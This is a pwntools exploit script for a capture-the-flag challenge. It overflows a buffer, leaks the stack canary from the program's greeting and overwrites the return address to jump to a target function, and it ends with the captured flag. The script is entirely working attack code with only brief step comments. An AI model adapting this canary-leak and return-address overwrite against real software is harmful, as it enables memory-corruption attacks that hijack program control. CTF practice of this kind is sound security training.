from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./leakcan_chall', '''
    b *0x4018a4
    b *0x4018ea
    b *0x401920
    continue
''')

# p = remote('leakcan-25b8ac0dd7fd.tcp.1753ctf.com', 8435)

GOAL_ADDR = 0x40194f
FAKE_RBP = 0

# 1. fill buffer until stack canary
p.recvuntil(b"What\'s your name?\n")
p.sendline(b'A'*0x58)

# 2. leak canary value
p.recvuntil(b"Hello! ")
canary_val = u64(b'\x00'+p.recv(0x60)[-7:])
log.info(f"canary value: {hex(canary_val)}")

# 3. overwrite return address
p.sendline(b'A'*0x58+p64(canary_val)+p64(FAKE_RBP)+p64(GOAL_ADDR))

p.interactive()

# 1753c{c4n4ry_1f_th3r35_4_m3m_l34k}